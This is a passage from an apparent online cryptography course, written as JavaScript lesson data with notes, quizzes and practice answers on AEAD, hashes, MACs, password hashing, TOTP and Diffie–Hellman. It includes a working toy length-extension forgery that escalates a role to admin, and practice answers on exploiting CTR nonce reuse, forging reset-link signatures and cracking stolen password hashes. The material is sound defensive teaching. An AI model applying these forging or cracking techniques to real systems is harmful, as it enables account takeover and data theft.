<p>The fix is <strong>authenticated encryption</strong> (AEAD: authenticated encryption with associated data). It encrypts and also attaches a <strong>tag</strong>, a short value computed from the key and the whole ciphertext, which Bob checks before using anything; a modified ciphertext fails the check and is rejected. "Associated data" is extra information, such as a header, that is authenticated but not encrypted. The standard choices are <strong>AES-GCM</strong> (CTR mode plus a fast tag) and <strong>ChaCha20-Poly1305</strong>. Lesson 3 explains how tags (MACs) work. In real code, encryption looks like this. It uses the <code>cryptography</code> package, which isn't part of Python's standard library (install it with <code>pip install cryptography</code>) and isn't available in this site's in-browser Python, so run it on your own computer:</p>
<pre data-label="Python (cryptography package, not run here)"><code>import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

aes_key = AESGCM.generate_key(bit_length=256)
aead = AESGCM(aes_key)
n12 = os.urandom(12)                            # a 12-byte nonce: never reuse one with this key
# arguments: nonce, plaintext, associated data (authenticated, not encrypted)
sealed = aead.encrypt(n12, b"pay ana $100", b"msg 17")
# sealed is the 12-byte ciphertext followed by the 16-byte tag: 28 bytes
opened = aead.decrypt(n12, sealed, b"msg 17")   # raises InvalidTag if anything was changed</code></pre>
<p>The third argument is the associated data: here a message number, sent in the clear beside the ciphertext, which the tag covers so it can't be altered either. The nonce isn't secret and is sent with the message too.</p>
<p>The library chooses the mode, the tag and the checks. What remains your job: generating keys with a secure random source, keeping them secret, and never reusing a nonce.</p>
<p class="note">Why it matters: almost every real break of symmetric encryption is a misuse (ECB, a reused nonce or key, no integrity check), not a break of AES itself.</p>
`,
      terms: [
        ["Symmetric cipher", "A cipher where the same secret key encrypts and decrypts."],
        ["One-time pad", "Encryption by XOR with a truly random key as long as the message, used once."],
        ["Perfect secrecy", "The ciphertext gives no information about the message beyond its length."],
        ["Two-time pad", "Reusing a one-time pad key, which reveals the XOR of the two messages."],
        ["Block cipher", "A keyed, invertible function on fixed-size blocks, such as AES with 16-byte blocks."],
        ["Pseudorandom permutation (PRP)", "A keyed permutation that, without the key, can't be told apart from a random permutation."],
        ["AES", "The Advanced Encryption Standard: a block cipher with 128-bit blocks and 128-, 192- or 256-bit keys."],
        ["Feistel network", "A cipher structure whose rounds map (L, R) to (R, L ⊕ F(R)), invertible for any round function F."],
        ["Mode of operation", "A rule for using a block cipher on messages longer than one block."],
        ["ECB", "Electronic codebook: encrypting each block separately, which leaks repeated blocks."],
        ["CBC", "Cipher block chaining: XOR each plaintext block with the previous ciphertext block before encrypting, starting from a random IV."],
        ["CTR", "Counter mode: XOR the message with encryptions of a nonce and successive counters."],
        ["Nonce", "A value that must never repeat for a given key, such as a counter or a long random value."],
        ["Malleability", "The property that an attacker can change a ciphertext so that it decrypts to a related plaintext."],
        ["Authenticated encryption (AEAD)", "Encryption that also produces a tag, so that any change to the ciphertext is detected; for example AES-GCM."]
      ],
      quiz: [
        { q: "Two messages were encrypted with the same one-time pad key. What can Eve compute from the two ciphertexts alone?", choices: ["The key", "The XOR of the two messages", "Nothing", "The first message"], answer: 1, why: "c1 ⊕ c2 = m1 ⊕ m2: the key cancels." },
        { q: "Why does ECB mode leak information?", choices: ["It uses a short key", "Equal plaintext blocks give equal ciphertext blocks", "It doesn't use the key", "AES is broken"], answer: 1, why: "Each block is encrypted independently and deterministically, so repetition shows through." },
        { q: "What goes wrong if a CTR-mode nonce is reused with the same key?", choices: ["Decryption fails", "The two messages are XORed with the same keystream, like a two-time pad", "Nothing, if the key is secret", "The ciphertext doubles in size"], answer: 1, why: "Same key and nonce give the same keystream, which cancels when the ciphertexts are XORed." },
        { q: "Why must secure encryption be randomized or use a nonce?", choices: ["To make it faster", "Otherwise encrypting the same message twice gives the same ciphertext, revealing that the messages are equal", "To make the key longer", "To allow padding"], answer: 1, why: "Deterministic encryption leaks equality of messages." },
        { q: "Eve flips bit 3 of a CTR-mode ciphertext. What happens to Bob's decryption, without authentication?", choices: ["It fails with an error", "Bit 3 of the plaintext flips; nothing else changes", "The whole message becomes random", "Nothing changes"], answer: 1, why: "Plaintext = ciphertext ⊕ keystream, bit by bit." },
        { q: "Which should new code use to encrypt data?", choices: ["AES in ECB mode", "AES in CBC mode without a MAC", "An authenticated encryption mode such as AES-GCM from a vetted library", "A one-time pad generated with random.random()"], answer: 2, why: "AEAD gives confidentiality and integrity, and a library avoids implementation mistakes." }
      ],
      practice: [
        {
          q: `<p>Explain, using the definition of XOR, why the one-time pad gives no information about a single message byte. Then explain why it gives information about the message's length, and how a system could hide length if that matters.</p>`,
          a: `<p>For a ciphertext byte <em>c</em>, each possible message byte <em>m</em> corresponds to exactly one key byte <em>k</em> = <em>m</em> ⊕ <em>c</em>. All 256 key bytes are equally likely, so after seeing <em>c</em>, all 256 message bytes remain equally likely: the posterior equals the prior. But the ciphertext has the same length as the message, so Eve learns the length; "yes" and "no" encrypt to different lengths. To hide length, pad every message to a fixed size (or to one of a few sizes) before encrypting. Length leaks have revealed which page of a website someone visited from the sizes of the encrypted responses.</p>`
        },
        {
          q: `<p>A program encrypts each database record with AES-CTR using the same key and the nonce <code>bytes(8)</code> every time. An attacker obtains the ciphertexts of a thousand records and the plaintext of one of them (their own). What can the attacker learn, and how?</p>`,
          a: `<p>Every record was XORed with the same keystream. From their own record, the attacker computes the keystream: <em>s</em> = <em>c</em><sub>own</sub> ⊕ <em>m</em><sub>own</sub>. XORing <em>s</em> with every other ciphertext decrypts it, up to the length of their own record (longer records leak their first part). Even without a known plaintext, the attacker could crib-drag pairs of records. The fix is a unique nonce per record with the same key (for instance a random 12-byte nonce stored beside each record) and, better, AES-GCM so that records can't be modified either.</p>`
        },
        {
          q: `<p>Using the toy <code>encrypt_block</code> from the notes, implement CBC encryption for a message whose length is a multiple of 16, with a given 16-byte IV. Show that the three-payment message from the ECB example no longer has two equal ciphertext blocks.</p>`,
          a: `<pre><code>def cbc_encrypt(key, iv, pt):
    prev, out = iv, b""
    for i in range(0, len(pt), 16):
        prev = encrypt_block(key, xor(pt[i:i + 16], prev))
        out += prev
    return out

ct = cbc_encrypt(key, bytes(range(16)), pt)
blocks = [ct[i:i + 16] for i in range(0, len(ct), 16)]
print(len(set(blocks)))   # 3</code></pre><p>The third plaintext block equals the first, but it is XORed with a different previous ciphertext block before encryption, so the inputs to <code>encrypt_block</code> differ and so do the outputs. A fresh random IV per message also makes the same message encrypt differently each time.</p>`
        },
        {
          q: `<p>A message is encrypted with AES-GCM, and the ciphertext is "pay ana $100" in some 12 bytes plus a 16-byte tag. Eve performs the CTR bit-flipping trick from the notes on the 12 bytes. What does Bob's call to <code>decrypt</code> do, and why can't Eve also fix the tag?</p>`,
          a: `<p>Bob's library recomputes the tag from the key and the received ciphertext and compares it with the received tag. The ciphertext changed, so the tags don't match, and <code>decrypt</code> raises <code>InvalidTag</code> without returning any plaintext. Eve can't compute the right tag for her modified ciphertext because the tag depends on the secret key; producing a valid tag without the key is exactly what the MAC is designed to make infeasible (Lesson 3). Her best chance is to guess a 128-bit tag, with probability 2<sup>−128</sup>.</p>`
        }
      ],
      sources: ["bonehshoup", "fips197", "pycryptosvc"]
    },
    {
      id: "sc3",
      title: "Hashes, MACs and passwords",
      minutes: 90,
      summary: "Cryptographic hash functions and their three resistance properties; the birthday bound with real numbers; message authentication codes, the length-extension attack that breaks H(key ‖ message), and HMAC; storing passwords with salts and slow hashing (PBKDF2, bcrypt, scrypt, Argon2); and authentication factors, one-time codes and phishing-resistant MFA.",
      notes: `
<p>CS 240 Lesson 2 met SHA-1 naming Git objects, and CS 240 Lesson 8 stored passwords as salted, slow hashes. This lesson says what properties make a hash function cryptographic, how to use one to authenticate messages, and why password storage needs more than a hash.</p>

<h3>Cryptographic hash functions</h3>
<p>A <strong>hash function</strong> maps an input of any length to a fixed-size <strong>digest</strong>. CS 201 Lesson 3's hash functions only had to spread keys over buckets. A <strong>cryptographic</strong> hash function must also resist a deliberate adversary. Three properties, from weakest to strongest:</p>
<ul>
<li><strong>Preimage resistance</strong> (one-way): given a digest <em>y</em>, it is infeasible to find any <em>x</em> with H(<em>x</em>) = <em>y</em>.</li>
<li><strong>Second-preimage resistance</strong>: given <em>x</em>, it is infeasible to find a different <em>x</em>′ with H(<em>x</em>′) = H(<em>x</em>).</li>
<li><strong>Collision resistance</strong>: it is infeasible to find <em>any</em> two different inputs with the same digest.</li>
</ul>
<p>Collisions must exist (infinitely many inputs, finitely many digests: the pigeonhole principle of MATH 121 Lesson 2); the point is that nobody can find one. A good hash also behaves like a random function: changing one input bit changes about half the output bits.</p>
<pre><code>import hashlib
print(hashlib.sha256(b"hello").hexdigest()[:16])   # 2cf24dba5fb0a30e
print(hashlib.sha256(b"hellp").hexdigest()[:16])   # fdd7585e08c4e2af</code></pre>
<p>The standard choices are SHA-256 and SHA-512 (the SHA-2 family, 2001) and SHA-3 (2015). MD5 and SHA-1 are broken for collisions: MD5 collisions were first published in 2004 and by 2006 took under a minute on a laptop, and in 2017 researchers published two different PDF files with the same SHA-1 digest. Git has been moving from SHA-1 to SHA-256 for this reason.</p>

<h3>The birthday bound</h3>
<p>How hard should finding a collision be? MATH 121 Lesson 6 showed that among <em>m</em> equally likely values, the chance of a repeat passes 50% after about √(2 ln 2 · <em>m</em>) ≈ 1.18√<em>m</em> random draws (23 people for a shared birthday), and the average number of draws until the first repeat is a little more, √(π<em>m</em>/2) ≈ 1.25√<em>m</em> (about 24). Either way it is a constant times √<em>m</em>. For an <em>n</em>-bit digest, <em>m</em> = 2<sup><em>n</em></sup>, so a brute-force collision search takes about 2<sup><em>n</em>/2</sup> hashes, not 2<sup><em>n</em></sup>. A small experiment with SHA-256 cut to 24 bits (3 bytes):</p>
<pre><code>import math

def h24(data):
    return hashlib.sha256(data).digest()[:3]

seen, i = {}, 0
while True:
    d = h24(str(i).encode())
    if d in seen:
        break
    seen[d] = i
    i += 1
print(seen[d], i, d.hex())   # 4163 8864 95d436
print(round(math.sqrt(math.pi * 2**24 / 2)))   # 5134</code></pre>
<p>The inputs "4163" and "8864" collide after 8,865 tries; the expected number is about 5,134 (one run varies). A full collision on 2<sup>24</sup> = 16.7 million values took thousands of tries, not millions. So a 256-bit hash gives 128-bit collision resistance: about 2<sup>128</sup> ≈ 3.4 × 10<sup>38</sup> hashes, out of reach. The same arithmetic sizes random nonces: a 96-bit random nonce is expected to repeat only after about 2<sup>48</sup> messages, which is why AES-GCM users are told to change keys long before that.</p>

<h3>Message authentication codes</h3>
<p>Lesson 2 showed that encryption doesn't stop tampering. A <strong>message authentication code</strong> (MAC) does. With a shared key <em>k</em>, the sender computes a tag <em>t</em> = MAC(<em>k</em>, <em>m</em>) and sends (<em>m</em>, <em>t</em>); the receiver recomputes the tag and accepts only if it matches. The security goal is <strong>unforgeability</strong>: without <em>k</em>, even after seeing tags on many messages of their choice, an attacker can't produce a valid tag on any new message.</p>
<p>The obvious construction, MAC(<em>k</em>, <em>m</em>) = SHA-256(<em>k</em> ‖ <em>m</em>) (‖ means concatenation), is broken for SHA-256, because of how SHA-256 is built. Like MD5 and SHA-1, it uses the <strong>Merkle–Damgård</strong> construction: pad the message to a multiple of the block size (64 bytes), appending its length; start from a fixed state; and feed each block in turn to a compression function, state = <em>f</em>(state, block). The digest <em>is</em> the final state. So anyone who knows H(<em>k</em> ‖ <em>m</em>) and the length of <em>k</em> ‖ <em>m</em> can continue hashing from that state: they can compute H(<em>k</em> ‖ <em>m</em> ‖ pad ‖ <em>m</em>′) for any <em>m</em>′ of their choice, without knowing <em>k</em>. This is a <strong>length-extension attack</strong>. A toy hash with the same structure shows it:</p>
<pre><code>def compress(state, block):             # toy compression function: 8-byte state, 16-byte blocks
    return hashlib.sha256(state + block).digest()[:8]

def pad(n):                             # padding for n bytes: 0x80, zeros, the length in 8 bytes
    return b"\\x80" + bytes((-(n + 9)) % 16) + n.to_bytes(8, "big")

def toy_hash(msg, state=bytes(8), already=0):
    data = msg + pad(already + len(msg))
    for i in range(0, len(data), 16):
        state = compress(state, data[i:i + 16])
    return state

secret = b"k3y-only-server"             # 15 bytes the attacker doesn't know
msg = b"user=ana&amp;role=student"
tag = toy_hash(secret + msg)            # the server's "MAC"

glue = pad(len(secret) + len(msg))      # the attacker knows the lengths, not the secret
extra = b"&amp;role=admin"
forged_tag = toy_hash(extra, state=tag, already=len(secret) + len(msg) + len(glue))
forged_msg = msg + glue + extra
print(forged_tag == toy_hash(secret + forged_msg))   # True</code></pre>
<p>The server would accept <code>forged_msg</code>, which ends in <code>&amp;role=admin</code>, with <code>forged_tag</code>. The padding bytes in the middle look like garbage, but many parsers skip them or let the later <code>role</code> win.</p>
<p><strong>HMAC</strong> (Bellare, Canetti and Krawczyk, 1996; RFC 2104) fixes this by hashing twice with two derived keys. With the key padded with zero bytes to the block size (64 bytes for SHA-256; a longer key is hashed first), ipad = 64 bytes of 0x36 and opad = 64 bytes of 0x5c:</p>
<p class="math">HMAC(<em>k</em>, <em>m</em>) = H((<em>k</em> ⊕ opad) ‖ H((<em>k</em> ⊕ ipad) ‖ <em>m</em>))</p>
<p>The outer hash is applied to a fixed-length input the attacker can't extend, so length extension fails; HMAC is provably a secure MAC if the compression function behaves like a PRF (a pseudorandom function, Lesson 2). Length extension comes from a digest that is the whole final state, as in SHA-256 and SHA-512. SHA-3 is built differently and outputs only part of its state, so it isn't vulnerable, and H(<em>k</em> ‖ <em>m</em>) with SHA-3 would be a sound MAC. HMAC is still the standard because it is safe with SHA-2 and SHA-3 alike. Python's <code>hmac</code> module implements it:</p>
<pre><code>import hmac
def my_hmac(key, msg):                  # for keys of at most 64 bytes
    key = key + bytes(64 - len(key))
    inner = hashlib.sha256(bytes(b ^ 0x36 for b in key) + msg).digest()
    return hashlib.sha256(bytes(b ^ 0x5c for b in key) + inner).digest()

t = my_hmac(b"key", b"pay ana 10")
print(t == hmac.new(b"key", b"pay ana 10", hashlib.sha256).digest())   # True</code></pre>
<p>Two rules for using MACs. Compare tags with <code>hmac.compare_digest</code>, never <code>==</code>, for the timing reason in Lesson 7. And when combining a MAC with encryption, <em>encrypt then MAC</em>: compute the tag over the ciphertext and check it before decrypting. That is what AES-GCM does internally.</p>

<h3>Storing passwords</h3>
<p>A login server must check passwords without storing them, because databases get stolen. Storing H(password) seems enough, since the hash is one-way. It isn't, because passwords are guessable. An attacker with the stolen hashes doesn't invert anything: they hash candidate passwords and look for matches, offline, as fast as their hardware allows. A single graphics card computes billions of SHA-256 hashes a second. Suppose 10<sup>10</sup> guesses a second against passwords of 8 lowercase letters:</p>
<pre><code>print(26**8)   # 208827064576
print(round(26**8 / 1e10, 1))   # 20.9</code></pre>
<p>Every such password falls in 21 seconds. Two defenses make this expensive:</p>
<ul>
<li>A <strong>salt</strong>: a random value, different for each user (16 bytes from <code>secrets.token_bytes</code>), stored next to the hash and hashed with the password. Without salts, one hash of "password123" checks every user at once, and precomputed tables of hashes of common passwords crack a whole database in one lookup. With salts, each guess tests one user.</li>
<li><strong>Slow hashing</strong>: a function that deliberately costs much more than one hash. <strong>PBKDF2</strong> iterates HMAC many times (PBKDF2-HMAC-SHA256 with 600,000 iterations is a current recommendation); <strong>bcrypt</strong> (1999) is built on a cipher with an expensive key setup; <strong>scrypt</strong> and <strong>Argon2</strong> (the 2015 Password Hashing Competition winner) are also <em>memory-hard</em>, needing lots of memory per guess, which hurts the attacker's thousands of small GPU cores far more than it hurts your one server.</li>
</ul>
<p>If each guess costs 10<sup>5</sup> times more, the 8-letter search takes 2.1 × 10<sup>6</sup> seconds, about 24 days per user, while a legitimate login spends a fraction of a second. Slow hashing can't save "password123", which is near the top of every guessing list, so servers also reject known-breached and common passwords. NIST's current guidelines (SP 800-63B-4) require at least 15 characters for passwords used alone (8 with a second factor), checking new passwords against such a blocklist, and <em>no</em> composition rules ("one digit and one symbol") or forced periodic changes, which mostly produce predictable variations.</p>
<p>CS 240 Lesson 8's code used <code>hashlib.pbkdf2_hmac</code>. The Python on this site, running in your browser, lacks it, so the programming problem builds PBKDF2 from <code>hmac</code>; real servers use a library such as <code>argon2-cffi</code> or <code>bcrypt</code>, which also encode the salt and cost in the stored string.</p>

<h3>Authentication factors and MFA</h3>
<p>Authentication can rest on something you <em>know</em> (a password), something you <em>have</em> (a phone, a security key) or something you <em>are</em> (a fingerprint). <strong>Multi-factor authentication</strong> (MFA) requires two kinds, so a stolen password alone isn't enough. A common second factor is a time-based one-time password (TOTP, RFC 6238), the 6-digit codes of authenticator apps: the server and the app share a secret, and the code is an HMAC of the current 30-second time step, cut down to digits.</p>
<pre><code>def totp(secret, t, digits=8, step=30):
    counter = (t // step).to_bytes(8, "big")
    mac = hmac.new(secret, counter, hashlib.sha1).digest()
    off = mac[-1] &amp; 0x0F                      # "dynamic truncation": pick 4 bytes
    code = int.from_bytes(mac[off:off + 4], "big") &amp; 0x7FFFFFFF
    return str(code % 10**digits).zfill(digits)

print(totp(b"12345678901234567890", 59))   # 94287082</code></pre>
<p>That matches the RFC's first test vector. The two truncation lines turn the 20-byte SHA-1 tag into a number. <code>mac[-1] &amp; 0x0F</code> keeps the low 4 bits of the last byte, an offset from 0 to 15, so the 4 bytes starting there always fit (at most bytes 15 to 18); taking the offset from the tag itself just means that which 4 bytes are used varies from code to code. <code>&amp; 0x7FFFFFFF</code> clears the top bit of the 32-bit number, leaving a value from 0 to 2<sup>31</sup> − 1, so that languages that read 4 bytes as a signed integer and languages that read them as unsigned get the same code (RFC 4226 gives this reason). The default is 8 digits because RFC 6238's published test vectors are 8-digit codes; authenticator apps use <code>digits=6</code>, which keeps the last six digits of the same number (<code>totp(b"12345678901234567890", 59, digits=6)</code> is 287082). (HMAC-SHA1 is still fine here: HMAC's security doesn't rest on collision resistance.) TOTP has a weakness: a convincing fake login page can ask for the code too, and relay it within the 30 seconds. <strong>Phishing-resistant</strong> factors, such as security keys and passkeys (the WebAuthn standard), sign a challenge with a private key that is bound to the real site's name (Lesson 4's signatures), so a look-alike site gets nothing it can use.</p>
<p class="note">Why it matters: hashes, MACs and slow password hashing are the most common cryptography you will write code around, and each has a classic misuse: MD5, H(key ‖ message), and unsalted fast hashes.</p>
`,
      terms: [
        ["Cryptographic hash function", "A function from any input to a fixed-size digest that resists preimage, second-preimage and collision attacks."],
        ["Preimage resistance", "Given a digest, it is infeasible to find an input with that digest."],
        ["Collision resistance", "It is infeasible to find two different inputs with the same digest."],
        ["Birthday bound", "A collision among n-bit values is expected after about 2^(n/2) random tries."],
        ["Message authentication code (MAC)", "A tag computed from a shared key and a message, which an attacker without the key can't forge."],
        ["Merkle–Damgård construction", "Building a hash by padding the message with its length and feeding blocks through a compression function; the digest is the final state."],
        ["Length-extension attack", "Using H(k ‖ m) to compute H(k ‖ m ‖ pad ‖ m′) without knowing k."],
        ["HMAC", "The MAC H((k ⊕ opad) ‖ H((k ⊕ ipad) ‖ m)), secure even for Merkle–Damgård hashes."],
        ["Encrypt-then-MAC", "Computing the MAC over the ciphertext and checking it before decrypting."],
        ["Salt", "A random per-user value hashed with a password, so that guesses must be made for each user separately."],
        ["Slow (password) hash", "A deliberately expensive function such as PBKDF2, bcrypt, scrypt or Argon2, to make guessing costly."],
        ["Memory-hard function", "A function that needs a lot of memory to compute, such as scrypt or Argon2, which limits parallel guessing hardware."],
        ["Multi-factor authentication (MFA)", "Requiring two or more kinds of evidence: something you know, have or are."],
        ["TOTP", "Time-based one-time password: an HMAC of the current time step, shown as a short code."],
        ["Phishing-resistant authentication", "Authentication, such as WebAuthn security keys, bound to the real site so that a fake site can't reuse it."]
      ],
      quiz: [
        { q: "About how many random tries does it take to find a collision in a 64-bit hash?", choices: ["2^64", "2^32", "64", "2^128"], answer: 1, why: "By the birthday bound, about 2^(64/2) = 2^32, roughly 4 billion." },
        { q: "Why is SHA-256(key ‖ message) not a safe MAC?", choices: ["SHA-256 has known collisions", "Length extension: the digest lets anyone compute the tag of the message with more data appended", "It is too slow", "The key is too short"], answer: 1, why: "The digest is SHA-256's internal state, from which hashing can continue." },
        { q: "What does a per-user salt prevent?", choices: ["Guessing any one password", "Testing one guess against every user at once, and precomputed tables", "Phishing", "Length extension"], answer: 1, why: "Each user's hash depends on their own salt, so every guess must be computed per user." },
        { q: "Why are scrypt and Argon2 designed to be memory-hard?", choices: ["To use less memory on servers", "Because attackers' parallel hardware has little memory per core, so memory cost limits their guessing rate", "To prevent collisions", "To make hashes longer"], answer: 1, why: "Memory is expensive to replicate across thousands of cores, while one server can afford it." },
        { q: "A server stores passwords as unsalted MD5 hashes. Which change matters most?", choices: ["Switch to unsalted SHA-256", "Use a salted, slow password hash such as Argon2, bcrypt or PBKDF2", "Encrypt the MD5 hashes", "Require passwords to contain a symbol"], answer: 1, why: "SHA-256 is still fast to guess; only salting plus slow hashing raises the cost of offline guessing." },
        { q: "Why can a fake login page defeat TOTP codes but not a security key?", choices: ["TOTP codes are too short", "The user can relay a TOTP code to the fake site, but a security key signs a challenge bound to the real site's name", "Security keys are encrypted", "TOTP uses SHA-1"], answer: 1, why: "The code works wherever it is typed within 30 seconds; the key's signature only works for the site it was registered with." }
      ],
      practice: [
        {
          q: `<p>A system gives each uploaded file a random 64-bit ID. How many files can it store before the chance of two files sharing an ID reaches about 50%? Use the approximation <em>k</em> ≈ 1.18√<em>m</em> from MATH 121 Lesson 6. How many bits would keep the chance negligible for 10<sup>12</sup> files?</p>`,
          a: `<pre><code>import math
print(f"{1.18 * math.sqrt(2**64):.2e}")   # 5.07e+09</code></pre><p>About 5 billion files. For 10<sup>12</sup> files, the chance of any collision is about <em>k</em><sup>2</sup>/(2<em>m</em>) = 10<sup>24</sup>/(2<em>m</em>). With 128-bit IDs, <em>m</em> ≈ 3.4 × 10<sup>38</sup>, giving about 1.5 × 10<sup>−15</sup>: negligible. That's why random identifiers such as version 4 UUIDs use 122 random bits.</p>`
        },
        {
          q: `<p>A web app sends users a link <code>/reset?user=ana&amp;expires=1700000000&amp;sig=…</code>, where <code>sig</code> is the hex SHA-256 of a server secret followed by the rest of the query string. Describe what an attacker who requests a reset for their own account could do, and give the one-line fix.</p>`,
          a: `<p>The attacker receives a valid link for their own query string, so they know H(secret ‖ q) and can guess the secret's length (or try lengths). By length extension they can compute a valid <code>sig</code> for q ‖ padding ‖ <code>&amp;user=victim</code> or <code>&amp;expires=9999999999</code>, and if the server's parser takes the last value of a repeated parameter, they can reset someone else's password or make a link that never expires. The fix is <code>sig = hmac.new(secret, q.encode(), "sha256").hexdigest()</code>, checked with <code>hmac.compare_digest</code>. (Better still, use a random single-use token stored on the server.)</p>`
        },
        {
          q: `<p>An attacker steals a database of 1,000,000 users' password hashes and can compute 10<sup>10</sup> SHA-256 hashes per second. Each user's password is one of the 10<sup>6</sup> most common passwords. How long does cracking every user take if the hashes are (a) unsalted SHA-256, (b) salted SHA-256, (c) salted PBKDF2 with 600,000 iterations (count one iteration as two hashes)?</p>`,
          a: `<pre><code>guesses, users, rate = 10**6, 10**6, 1e10
print(guesses / rate)   # 0.0001
print(guesses * users / rate)   # 100.0
print(round(guesses * users * 1_200_000 / rate / 86400 / 365, 1))   # 3.8</code></pre><p>(a) Hash each common password once and look up all the hashes: 10<sup>−4</sup> seconds. (b) Salts force each guess to be made per user: 10<sup>12</sup> hashes, 100 seconds. Salting alone doesn't save weak passwords from a fast hash. (c) Each guess costs 1.2 million hashes, so the full search takes 1.2 × 10<sup>8</sup> seconds, about 3.8 years, on the same hardware; a single user costs about 2 minutes. That is a huge improvement, but not safety: an attacker who tries only the top thousand passwords on each user still cracks every user whose password is among them, in about 33 hours (10<sup>3</sup> × 10<sup>6</sup> × 1.2 × 10<sup>6</sup> hashes at 10<sup>10</sup> a second). That's why servers must also reject common passwords, and why the database must not be stolen in the first place.</p>`
        },
        {
          q: `<p>Using the notes' <code>totp</code>, compute the 8-digit code at time 1111111109 (the RFC's second test vector). Why does the server usually also accept the code from the previous 30-second step, and what does it need to do to stop the same code being used twice?</p>`,
          a: `<pre><code>print(totp(b"12345678901234567890", 1111111109))   # 07081804</code></pre><p>Clocks on phones drift, and the user needs time to type the code, so servers accept one step either side. To stop replay (an observer reusing a code within its window), the server remembers the last time step successfully used for each user and rejects any code for that step or an earlier one. It must also limit attempts: a 6-digit code has only a million values.</p>`
        }
      ],
      sources: ["bonehshoup", "rfc2104", "nist80063b", "pycryptosvc"]
    },
    {
      id: "sc4",
      title: "Public-key cryptography",
      minutes: 90,
      summary: "The key-distribution problem; Diffie–Hellman key exchange and the man-in-the-middle attack on it; RSA signatures with hash-then-sign, and why textbook RSA is unsafe (determinism, malleability, small messages) until padded with OAEP or PSS; certificates and chains of trust; and how TLS 1.3 combines all of these.",
      notes: `
<p>Symmetric cryptography needs a shared key, and sharing it is the hard part. A network of <em>n</em> people who each want a private channel with every other needs <em>n</em>(<em>n</em> − 1)/2 keys: 499,500 for a thousand people, each delivered secretly. Public-key cryptography, which MATH 121 Lesson 5 introduced with RSA, removes that step. This lesson covers its two main jobs, agreeing on keys and signing, and how the web decides whose public key is whose.</p>

<h3>Diffie–Hellman key exchange</h3>
<p>Whitfield Diffie and Martin Hellman's 1976 paper showed how two people can agree on a secret over a channel Eve hears completely. Publicly fix a large prime <em>p</em> and a number <em>g</em> whose powers mod <em>p</em> run through many values (a <em>generator</em>). Then:</p>
<ol>
<li>Alice picks a secret <em>a</em> and sends <em>A</em> = <em>g</em><sup><em>a</em></sup> mod <em>p</em>.</li>
<li>Bob picks a secret <em>b</em> and sends <em>B</em> = <em>g</em><sup><em>b</em></sup> mod <em>p</em>.</li>
<li>Alice computes <em>B</em><sup><em>a</em></sup> mod <em>p</em>; Bob computes <em>A</em><sup><em>b</em></sup> mod <em>p</em>. Both equal <em>g</em><sup><em>ab</em></sup> mod <em>p</em>, because (<em>g</em><sup><em>b</em></sup>)<sup><em>a</em></sup> = (<em>g</em><sup><em>a</em></sup>)<sup><em>b</em></sup>.</li>
</ol>
<pre><code>p, g = 23, 5
a, b = 6, 15                     # Alice's and Bob's secrets
A, B = pow(g, a, p), pow(g, b, p)
print(A, B)   # 8 19
print(pow(B, a, p), pow(A, b, p))   # 2 2</code></pre>
<p>Eve sees <em>p</em>, <em>g</em>, 8 and 19. To get the shared secret she seems to need <em>a</em> from <em>A</em> = <em>g</em><sup><em>a</em></sup> mod <em>p</em>: the <strong>discrete logarithm problem</strong>. With <em>p</em> = 23 she tries all 22 exponents (the programming problem does this). With a 2048-bit prime, no known classical algorithm is fast enough. Modern systems mostly use the same idea in a different <em>group</em>. A group is a set with an operation that is associative, has an identity element, and gives every element an inverse; the numbers 1 to <em>p</em> − 1 under multiplication mod <em>p</em> are one, and Diffie–Hellman needs nothing else from them. An <em>elliptic curve</em> group is the set of points (<em>x</em>, <em>y</em>), with coordinates mod a prime, that satisfy an equation such as <em>y</em><sup>2</sup> = <em>x</em><sup>3</sup> + 486662<em>x</em><sup>2</sup> + <em>x</em> (mod 2<sup>255</sup> − 19), with a rule for combining two points into a third. In X25519, which uses that curve, <em>g</em><sup><em>a</em></sup> becomes "combine the base point with itself <em>a</em> times", and 256-bit numbers give security similar to a 3072-bit prime's. The algebra differs (and is beyond this course); the protocol is identical. The shared number is then passed through a hash-based <em>key derivation function</em> (such as HKDF, built from HMAC) to make the symmetric keys.</p>
<p>If Alice and Bob pick fresh secrets for every session and erase them afterwards, a later theft of their long-term keys can't decrypt old sessions, because the session secrets no longer exist anywhere. This is <strong>forward secrecy</strong>.</p>

<h4>The man in the middle</h4>
<p>Diffie–Hellman alone has a fatal weakness against an attacker who can change messages, not just read them. Mallory intercepts <em>A</em>, sends Bob her own <em>M</em> = <em>g</em><sup><em>m</em></sup> instead, and does the same in the other direction. Alice unknowingly agrees a key with Mallory (<em>g</em><sup><em>am</em></sup>), Bob agrees a different one with Mallory (<em>g</em><sup><em>bm</em></sup>), and Mallory decrypts, reads and re-encrypts everything in between. Neither side can tell, because a number arriving over the network carries no evidence of who sent it. The exchange must be <strong>authenticated</strong>: at least one side must prove that its value really came from it. That is what signatures do.</p>

<h3>Digital signatures</h3>
<p>A <strong>digital signature</strong> is the public-key version of a MAC: only the holder of the private key can produce it, and anyone with the public key can check it. Unlike a MAC, a signature convinces third parties too, since the verifier couldn't have made it. With RSA, using MATH 121's notation (public (<em>n</em>, <em>e</em>), private <em>d</em>), signing uses <em>d</em> and verifying uses <em>e</em>, the reverse of encryption. A message is first hashed, so that any length can be signed and the hash, not the message, is exponentiated:</p>
<p class="math">sign: <em>s</em> = H(<em>m</em>)<sup><em>d</em></sup> mod <em>n</em> &nbsp;&nbsp;&nbsp; verify: accept if <em>s</em><sup><em>e</em></sup> mod <em>n</em> = H(<em>m</em>)</p>
<pre><code>import hashlib

def H(data, n):                    # hash, read as an integer, reduced mod n (toy n only)
    return int.from_bytes(hashlib.sha256(data).digest(), "big") % n

n, e, d = 3233, 17, 2753           # MATH 121 Lesson 5's key
h = H(b"I owe Ana $10", n)
s = pow(h, d, n)
print(h, s, pow(s, e, n) == h)   # 2181 951 True</code></pre>
<p>Verification works for the same reason RSA decryption does: <em>s</em><sup><em>e</em></sup> = H(<em>m</em>)<sup><em>de</em></sup> ≡ H(<em>m</em>) (mod <em>n</em>), since <em>de</em> ≡ 1 (mod φ(<em>n</em>)). A real key has <em>n</em> of 2048 bits or more, larger than any 256-bit hash; with <em>n</em> = 3233, many messages share H(<em>m</em>) mod <em>n</em>, so this toy is easy to forge.</p>

<h3>Why textbook RSA is unsafe</h3>
<p>MATH 121 Lesson 5 warned that RSA as defined there, "textbook" RSA, isn't safe to use directly. Now we can say exactly why.</p>
<ul>
<li><strong>It is deterministic.</strong> Encrypting the same message gives the same ciphertext, which leaks equality (Lesson 2). Worse, if the possible messages are few ("yes" or "no", a salary in whole thousands), Eve encrypts each candidate with the public key and compares.</li>
